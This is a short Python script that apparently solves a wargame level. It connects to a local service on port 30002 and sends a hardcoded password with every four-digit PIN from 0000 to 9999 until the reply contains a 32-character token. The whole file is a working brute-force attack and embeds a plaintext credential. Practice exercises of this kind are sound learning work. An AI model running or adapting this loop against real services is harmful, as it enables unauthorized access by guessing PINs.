import socket
import threading
import re
import sys


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('127.0.0.1', 30002))

password = "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar"

print(sock.recv(1024).decode())

for pin_num in range(10000):
    attempt = f"{password} {str(pin_num).zfill(4)}\n"
    sock.sendall(attempt.encode())
    result = sock.recv(2048).decode()
    matches = re.findall(r'\b[A-Za-z0-9]{32}\b', result)
    if matches:
        print(f"success {result}")
        break